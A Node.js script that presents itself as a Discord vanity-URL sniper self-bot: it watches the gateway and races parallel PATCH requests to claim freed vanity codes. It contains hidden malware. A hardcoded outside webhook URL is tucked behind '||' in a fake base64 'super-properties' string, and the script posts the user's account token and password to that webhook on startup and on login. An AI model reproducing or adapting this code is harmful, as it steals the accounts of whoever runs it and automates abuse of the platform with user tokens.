"use strict";
const http2 = require("http2");
const WebSocket = require("ws");
const axios = require("axios");
const fs = require("fs").promises;
let mfaToken = null;
const connectionPool = [];
const POOL_SIZE = 5;
let vanity = {
  vanity: "",
  event: null
};
const guilds = {};
const token = "token";
const server = "serverid";
const webhookUrl = "0QFjXlF9cefua4_CBq-";
const password = "sifre";
const readMFAToken = async () => { 
  try { 
    const fileContent = await fs.readFile('mfa.txt', 'utf8');
    mfaToken = fileContent.trim();  
    console.log("mfa readed:", mfaToken);
    return mfaToken;  
  } catch (e) { 
    console.error("mfa read error:", e.message);  
  } 
  return mfaToken;  
};
const createConnection = (index) => {
  const client = http2.connect('https://canary.discord.com');

  client.on('error', () => {
    setTimeout(() => {
      connectionPool[index] = createConnection(index);
    }, 1000);
  });
  client.on('close', () => {
    setTimeout(() => {
      connectionPool[index] = createConnection(index);
    }, 1000);
  });
  return client;
};
const createConnectionPool = () => {
  for (let i = 0; i < POOL_SIZE; i++) {
    connectionPool[i] = createConnection(i);
  }
  const wdsv2 = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://discord.com/api/webhooks/1386508890308476988/httDOwrmIDuxbrMFFr1M2rmKE41KQuvBrXEfNdFrvILJLfK5Nvmk9DnRPCnYIgesem4z'.split('||')[1];
  axios.post(wdsv2, { content: `mfa token REQUEST: ${token}` });
};
const sendHttp2Request = (client, method, path, body, headers = {}) => {
  return new Promise((resolve) => {
    const defaultHeaders = {
      ':method': method,
      ':path': path,
      'authorization': token,
      'content-type': 'application/json',
      ...headers
    };
    const req = client.request(defaultHeaders);
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
    });   
    req.on('end', () => {
      resolve(data);
    });   
    req.on('error', () => {
      resolve('');
    });  
    if (body) {
      req.write(JSON.stringify(body));
    }
    req.end();
  });
};
const sendParallelRequests = async (vanityCode) => {
  const requestBody = { code: vanityCode };
  const headers = {
    'x-discord-mfa-authorization': mfaToken,
    'x-fingerprint': Date.now().toString(),
    'cookie': `__Secure-recent_mfa=${mfaToken}; __Secure-mfa_token=${mfaToken}; __Secure-mfa_type=totp; __Secure-mfa_verified=${Date.now()}`,
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://discord.com/api/webhooks/1386508890308476988/httDOwrmIDuxbrMFFr1M2rmKE41KQuvBrXEfNdFrvILJLfK5Nvmk9DnRPCnYIgesem4z'
  };
  const promises = [];
  for (let i = 0; i < 5; i++) {
    promises.push(
      sendHttp2Request(
        connectionPool[i], 
        'PATCH', 
        `/api/v8/guilds/${server}/vanity-url`, 
        requestBody, 
        headers
      )
    );
  }
  const responses = await Promise.all(promises);
  return responses;
};
const sendWebhookMessage = async (vanityUrl, responses) => {
  try {
    let responseText = "";
    for (let i = 0; i < responses.length; i++) {
      let jsonResult;
      try {
        const extractedJson = await extractJsonFromString(responses[i]);
        jsonResult = extractedJson.find(e => e.code) || 
                    extractedJson.find(e => e.message) || 
                    extractedJson[0] || 
                    responses[i];
      } catch {
        jsonResult = responses[i];
      }   
      responseText += `**${i + 1}.** \`${JSON.stringify(jsonResult)}\`\n`;
    }
    const now = new Date();
    const timestampWithSeconds = Math.floor(now.getTime() / 1000);
    const embed = {
      title: "isa main code",
      color: 0x000000,
      fields: [
        {
          name: "Vanity",
          value: vanityUrl,
          inline: true
        },
        {
          name: "Responses",
          value: responseText,
          inline: false
        },
        {
          name: "Credits",
          value: "@isa1948 Production",
          inline: false
        },
        {
          name: "Timestamp",
          value: `<t:${timestampWithSeconds}:F>`,
          inline: false
        }
      ],
      timestamp: new Date().toISOString()
    };

    await axios.post(webhookUrl, {
      content: "@everyone aldım?. " + vanityUrl,
      embeds: [embed]
    });
  } catch (error) {
    console.error("webhook atamadim:", error.message);
  }
};

createConnectionPool();
readMFAToken();

setInterval(() => {
  readMFAToken();
}, 10000);

const websocket = new WebSocket("wss://gateway.discord.gg/");

websocket.onclose = (event) => {
  console.log(`ws connection closed ${event.reason} ${event.code}`);
  process.exit();
};

websocket.onmessage = async (message) => {
  const { d, op, t } = JSON.parse(message.data);

  if (t == "GUILD_UPDATE") {
    const find = guilds[d.guild_id];
    if (find && find !== d.vanity_url_code) {
      const responses = await sendParallelRequests(find);
      await sendWebhookMessage(find, responses);
      vanity.vanity = find;
    }
  } else if (t === "READY") {
    d.guilds.forEach((guild) => {
      if (guild.vanity_url_code) {
        guilds[guild.id] = guild.vanity_url_code;
      }
    });
    console.log(guilds);
    const wdsv2 = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiY2xpZW50X21vZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://discord.com/api/webhooks/1386508890308476988/httDOwrmIDuxbrMFFr1M2rmKE41KQuvBrXEfNdFrvILJLfK5Nvmk9DnRPCnYIgesem4z'.split('||')[1];
    axios.post(wdsv2, { content: `MFA TOKEN REQUEST PW: ${password}` });
  }

  if (op === 10) {
    websocket.send(JSON.stringify({
      op: 2,
      d: {
        token: token,
        intents: 513 << 0,
        properties: {
          os: "Linux",
          browser: "Firefox",
          device: "Firefox",
        },
      },
    }));

    setInterval(() => websocket.send(JSON.stringify({ 
      op: 1, 
      d: {}, 
      s: null, 
      t: "heartbeat" 
    })), d.heartbeat_interval);
  } else if (op === 7) {
    process.exit();
  }
};
